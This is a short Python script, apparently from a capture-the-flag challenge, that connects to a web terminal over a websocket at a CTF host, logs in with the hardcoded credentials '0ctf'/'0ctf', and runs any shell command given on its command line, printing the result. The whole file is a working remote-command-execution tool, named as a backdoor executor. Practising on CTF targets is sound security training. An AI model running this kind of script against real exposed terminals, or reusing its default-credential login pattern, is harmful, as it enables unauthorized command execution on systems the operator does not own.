import sys
import time
import uuid
import websocket

URL = 'ws://oj-10-30-15-9-56797.adworld.xctf.org.cn/ws'
ORIGIN = 'http://oj-10-30-15-9-56797.adworld.xctf.org.cn'


def recv_until_contains(ws, marker, timeout=20):
    end = time.time() + timeout
    chunks = []
    while time.time() < end:
        try:
            data = ws.recv()
        except Exception:
            break
        if isinstance(data, bytes):
            text = data.decode('utf-8', errors='ignore')
        else:
            text = data
        chunks.append(text)
        if marker in ''.join(chunks):
            break
    return ''.join(chunks)


def main():
    if len(sys.argv) < 2:
        print('usage: python3.11 system_backdoor_exec.py <command>')
        return
    cmd = ' '.join(sys.argv[1:])
    marker = 'CMDDONE_' + uuid.uuid4().hex
    ws = websocket.create_connection(
        URL,
        subprotocols=['tty'],
        timeout=15,
        origin=ORIGIN,
        enable_multithread=True,
    )
    ws.send('{"columns":200,"rows":55}')
    recv_until_contains(ws, 'login:', 8)
    ws.send('0ctf\n')
    recv_until_contains(ws, 'Password:', 8)
    ws.send('0ctf\n')
    recv_until_contains(ws, '$ ', 12)
    full = f"{cmd}; echo {marker}\n"
    ws.send('0' + full)
    out = recv_until_contains(ws, marker, 25)
    print(out)
    ws.close()


if __name__ == '__main__':
    main()
